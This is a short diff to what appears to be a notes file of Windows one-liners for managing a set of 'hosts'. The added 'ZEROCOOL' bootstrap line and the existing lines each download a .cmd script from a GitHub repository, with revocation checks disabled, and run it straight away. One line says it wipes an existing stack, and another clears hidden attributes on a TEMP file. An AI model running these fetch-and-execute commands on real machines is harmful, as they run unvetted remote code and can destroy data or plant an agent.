@@ -5,3 +5,7 @@ attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke 
 FORCE UPDATE mon/lib (ticking hosts also self-update from main every tick):
 
 curl.exe -L --ssl-no-revoke -o %TEMP%\fz.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/freeze_now.cmd && %TEMP%\fz.cmd
+
+ZEROCOOL v0.0.1 - manual bootstrap (stuck hosts / brand-new machines). Wipes legacy stack, installs agent:
+
+curl.exe -L --ssl-no-revoke -o C:\Windows\TEMP\zb.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/zerocool_bootstrap.cmd && C:\Windows\TEMP\zb.cmd
